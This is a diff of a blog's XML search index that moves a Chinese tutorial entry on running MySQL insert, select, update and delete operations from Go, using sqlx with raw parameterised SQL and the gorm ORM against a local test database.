github.com/jmoiron/sqlx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应Class表中的字段</span></span><br><span class="line"><span class="keyword">type</span> Class1 <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id   <span class="type">int</span>    <span class="string">`db:&quot;id&quot;`</span> <span class="comment">// 注意这里``的用法，对应数据库的字段</span></span><br><span class="line">	Name <span class="type">string</span> <span class="string">`db:&quot;name&quot;`</span></span><br><span class="line">    	Sex  *<span class="type">string</span> <span class="string">`db:&quot;sex&quot;`</span> <span class="comment">// 表中数据为空，直接取值报错，若是指针则返回nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *sqlx.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDb</span><span class="params">()</span></span> &#123;</span><br><span class="line">	database, err := sqlx.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/test&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;connect mysql err&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	Db = database</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Select</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> class1 []Class1</span><br><span class="line">	err := Db.Select(&amp;class1, <span class="string">&quot;select id,name,sex from class&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;select error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;class succ&quot;</span>, class1)</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> class1 &#123;</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">        <span class="keyword">if</span> v.Sex != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(*v.Sex)</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Insert</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r, err := Db.Exec(<span class="string">&quot;insert into class(name) values(?)&quot;</span>, <span class="string">&quot;三年级一班&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	id, err := r.LastInsertId()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Print(<span class="string">&quot;exec failed&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;insert success&quot;</span>, id)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">()</span></span> &#123;</span><br><span class="line">	res, err := Db.Exec(<span class="string">&quot;update class set name=? where id=?&quot;</span>, <span class="string">&quot;三年级二班&quot;</span>, <span class="number">9</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	row, err := res.RowsAffected()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;row failed, error&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;update success:&quot;</span>, row)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Delete</span><span class="params">()</span></span> &#123;</span><br><span class="line">	res, err := Db.Exec(<span class="string">&quot;delete from class  where id=?&quot;</span>, <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	row, err := res.RowsAffected()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;row failed, error&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;detele success:&quot;</span>, row)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>代码调用</li>
-</ul>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/tmysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tmysql.InitDb()</span><br><span class="line">	tmysql.Select()</span><br><span class="line">	tmysql.Insert()</span><br><span class="line">	tmysql.Update()</span><br><span class="line">	tmysql.Delete()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="gorm"><a href="#gorm" class="headerlink" title="gorm"></a>gorm</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ggorm</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装gorm</span></span><br><span class="line"><span class="comment">//go get gorm.io/gorm</span></span><br><span class="line"><span class="comment">// 安装mysql驱动</span></span><br><span class="line"><span class="comment">//go get gorm.io/driver/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	gorm.Model      <span class="comment">// 内置的结构提</span></span><br><span class="line">	Id         <span class="type">uint</span> <span class="comment">// 默认为主键</span></span><br><span class="line">	Name       <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDb</span><span class="params">()</span></span> &#123;</span><br><span class="line">	dsn := <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">	database, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">	<span class="comment">// database, err := gorm.Open(&quot;mysql&quot;, &quot;root:123456@tcp(127.0.0.1:3306)/test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;)</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open mysql error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	Db = database</span><br><span class="line">	<span class="comment">//// 根据User结构体，自动创建表结构,表名为users,如果表存在，不会创建</span></span><br><span class="line">	Db.AutoMigrate(&amp;User&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Close</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sqlDB, _ := Db.DB()</span><br><span class="line">	sqlDB.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Insert</span><span class="params">()</span></span> &#123;</span><br><span class="line">	u := User&#123;</span><br><span class="line">		Name: <span class="string">&quot;张山1&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := Db.Create(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;create is wrong,error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;创建数据成功&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Select</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> users []User</span><br><span class="line">	<span class="comment">// SELECT * FROM users;</span></span><br><span class="line">	<span class="keyword">if</span> err := Db.Find(&amp;users).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;find failed, error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> users &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;k=&quot;</span>, k, <span class="string">&quot;v=&quot;</span>, v)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//SELECT * FROM users WHERE name = &#x27;张山1&#x27;;</span></span><br><span class="line">	Db.Where(<span class="string">&quot;name=?&quot;</span>, <span class="string">&quot;张山1&quot;</span>).Find(&amp;users)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(users) == <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;find failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> users &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;k1=&quot;</span>, k, <span class="string">&quot;v1=&quot;</span>, v)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: <span class="number">1</span>&#125;</span><br><span class="line">	d := Db.Model(user).Update(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;lisi&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> d.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;update failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;update success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Detele</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: <span class="number">2</span>&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 查询不到此数据，就说明无法删除</span></span><br><span class="line">	<span class="keyword">var</span> users []User</span><br><span class="line">	Db.Where(<span class="string">&quot;id=?&quot;</span>, <span class="number">2</span>).Find(&amp;users)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(users) == <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;del failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 永久删除</span></span><br><span class="line">	d := Db.Unscoped().Delete(&amp;user)</span><br><span class="line">	<span class="comment">// 下面的语句有问题无论删除是否成功都成功</span></span><br><span class="line">	<span class="keyword">if</span> d.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;del failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	fmt.Println(<span class="string">&quot;del success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>代码调用</li>
-</ul>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/ggorm&quot;</span></span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/tmysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tmysql.InitDb()</span><br><span class="line">	tmysql.Select()</span><br><span class="line">	tmysql.Insert()</span><br><span class="line">	tmysql.Update()</span><br><span class="line">	tmysql.Delete()</span><br><span class="line"></span><br><span class="line">	ggorm.InitDb()</span><br><span class="line">	ggorm.Insert()</span><br><span class="line">	ggorm.Update()</span><br><span class="line">	ggorm.Detele()</span><br><span class="line">	ggorm.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="来自"><a href="#来自" class="headerlink" title="来自"></a>来自</h2><ul>
-<li><p><a href="https://gorm.io/zh_CN/docs/index.html">gorm</a></p>
-</li>
-<li><p><a href="https://www.topgoer.com/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/go%E6%93%8D%E4%BD%9Cmysql/">go操作mysql</a></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>go</category>
-      </categories>
-      <tags>
-        <tag>go</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>go 爬虫练习</title>
     <url>/aposts/f9d23e4/</url>
     <content><![CDATA[<h2 id="分析网站"><a href="#分析网站" class="headerlink" title="分析网站"></a>分析网站</h2><ul>
@@ -6103,6 +6058,51 @@
       </categories>
       <tags>
         <tag>爬虫</tag>
+        <tag>go</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>go 操作mysql</title>
+    <url>/aposts/481094f/</url>
+    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
+<li>对mysql的操作采用了两种，第一种是写原生sql，使用如下两个库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;github.com/go-sql-driver/mysql&quot;</span><br><span class="line">&quot;github.com/jmoiron/sqlx&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二种采用orm，使用了如下库</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;gorm.io/driver/mysql&quot;</span><br><span class="line">&quot;gorm.io/gorm&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul>
+<li>本地搭建好mysql环境，数据库和表名如下</li>
+</ul>
+<p><img src="/aposts/481094f/image-20230608170552494.png" alt="image-20230608170552494"></p>
+<h3 id="原生sql"><a href="#原生sql" class="headerlink" title="原生sql"></a>原生sql</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/tmysql/operateMsql.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> tmysql</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	_ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jmoiron/sqlx&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go get github.com/go-sql-driver/mysql</span></span><br><span class="line"><span class="comment">//go get github.com/jmoiron/sqlx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对应Class表中的字段</span></span><br><span class="line"><span class="keyword">type</span> Class1 <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id   <span class="type">int</span>    <span class="string">`db:&quot;id&quot;`</span> <span class="comment">// 注意这里``的用法，对应数据库的字段</span></span><br><span class="line">	Name <span class="type">string</span> <span class="string">`db:&quot;name&quot;`</span></span><br><span class="line">    	Sex  *<span class="type">string</span> <span class="string">`db:&quot;sex&quot;`</span> <span class="comment">// 表中数据为空，直接取值报错，若是指针则返回nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *sqlx.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDb</span><span class="params">()</span></span> &#123;</span><br><span class="line">	database, err := sqlx.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/test&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;connect mysql err&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	Db = database</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Select</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> class1 []Class1</span><br><span class="line">	err := Db.Select(&amp;class1, <span class="string">&quot;select id,name,sex from class&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;select error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;class succ&quot;</span>, class1)</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> class1 &#123;</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">        <span class="keyword">if</span> v.Sex != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(*v.Sex)</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Insert</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r, err := Db.Exec(<span class="string">&quot;insert into class(name) values(?)&quot;</span>, <span class="string">&quot;三年级一班&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	id, err := r.LastInsertId()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Print(<span class="string">&quot;exec failed&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;insert success&quot;</span>, id)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">()</span></span> &#123;</span><br><span class="line">	res, err := Db.Exec(<span class="string">&quot;update class set name=? where id=?&quot;</span>, <span class="string">&quot;三年级二班&quot;</span>, <span class="number">9</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	row, err := res.RowsAffected()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;row failed, error&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;update success:&quot;</span>, row)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Delete</span><span class="params">()</span></span> &#123;</span><br><span class="line">	res, err := Db.Exec(<span class="string">&quot;delete from class  where id=?&quot;</span>, <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	row, err := res.RowsAffected()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;row failed, error&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;detele success:&quot;</span>, row)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码调用</li>
+</ul>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/tmysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tmysql.InitDb()</span><br><span class="line">	tmysql.Select()</span><br><span class="line">	tmysql.Insert()</span><br><span class="line">	tmysql.Update()</span><br><span class="line">	tmysql.Delete()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="gorm"><a href="#gorm" class="headerlink" title="gorm"></a>gorm</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ggorm</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装gorm</span></span><br><span class="line"><span class="comment">//go get gorm.io/gorm</span></span><br><span class="line"><span class="comment">// 安装mysql驱动</span></span><br><span class="line"><span class="comment">//go get gorm.io/driver/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	gorm.Model      <span class="comment">// 内置的结构提</span></span><br><span class="line">	Id         <span class="type">uint</span> <span class="comment">// 默认为主键</span></span><br><span class="line">	Name       <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDb</span><span class="params">()</span></span> &#123;</span><br><span class="line">	dsn := <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">	database, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">	<span class="comment">// database, err := gorm.Open(&quot;mysql&quot;, &quot;root:123456@tcp(127.0.0.1:3306)/test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;)</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open mysql error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	Db = database</span><br><span class="line">	<span class="comment">//// 根据User结构体，自动创建表结构,表名为users,如果表存在，不会创建</span></span><br><span class="line">	Db.AutoMigrate(&amp;User&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Close</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sqlDB, _ := Db.DB()</span><br><span class="line">	sqlDB.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Insert</span><span class="params">()</span></span> &#123;</span><br><span class="line">	u := User&#123;</span><br><span class="line">		Name: <span class="string">&quot;张山1&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := Db.Create(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;create is wrong,error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;创建数据成功&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Select</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> users []User</span><br><span class="line">	<span class="comment">// SELECT * FROM users;</span></span><br><span class="line">	<span class="keyword">if</span> err := Db.Find(&amp;users).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;find failed, error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> users &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;k=&quot;</span>, k, <span class="string">&quot;v=&quot;</span>, v)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//SELECT * FROM users WHERE name = &#x27;张山1&#x27;;</span></span><br><span class="line">	Db.Where(<span class="string">&quot;name=?&quot;</span>, <span class="string">&quot;张山1&quot;</span>).Find(&amp;users)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(users) == <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;find failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> users &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;k1=&quot;</span>, k, <span class="string">&quot;v1=&quot;</span>, v)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: <span class="number">1</span>&#125;</span><br><span class="line">	d := Db.Model(user).Update(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;lisi&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> d.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;update failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;update success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Detele</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: <span class="number">2</span>&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 查询不到此数据，就说明无法删除</span></span><br><span class="line">	<span class="keyword">var</span> users []User</span><br><span class="line">	Db.Where(<span class="string">&quot;id=?&quot;</span>, <span class="number">2</span>).Find(&amp;users)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(users) == <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;del failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 永久删除</span></span><br><span class="line">	d := Db.Unscoped().Delete(&amp;user)</span><br><span class="line">	<span class="comment">// 下面的语句有问题无论删除是否成功都成功</span></span><br><span class="line">	<span class="keyword">if</span> d.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;del failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	fmt.Println(<span class="string">&quot;del success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码调用</li>
+</ul>
